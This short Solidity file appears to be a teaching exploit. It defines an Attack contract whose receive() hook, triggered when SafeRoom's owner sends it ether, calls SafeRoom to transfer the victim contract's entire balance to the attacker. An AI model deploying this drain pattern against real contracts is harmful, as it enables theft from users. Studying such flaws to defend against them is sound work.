// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "./SafeRoom.sol";

contract Attack {
    address payable public owner;
    SafeRoom safeRoom;

    constructor (SafeRoom _safeRoom) {
        safeRoom = SafeRoom(_safeRoom);
        owner = payable(msg.sender);
    }

    function attack () public {
        safeRoom.transfer(owner, address(safeRoom).balance);
    }

    // when SafeRoom contract owner(EOA) sends ether to this contract
    // recieve is triggered
    // this calls attack
    // and funds is drained from SafeRoom
    receive () external payable{
        attack();
    }

    function getBalance() public view returns (uint bal){
        bal = address(this).balance;
    }

}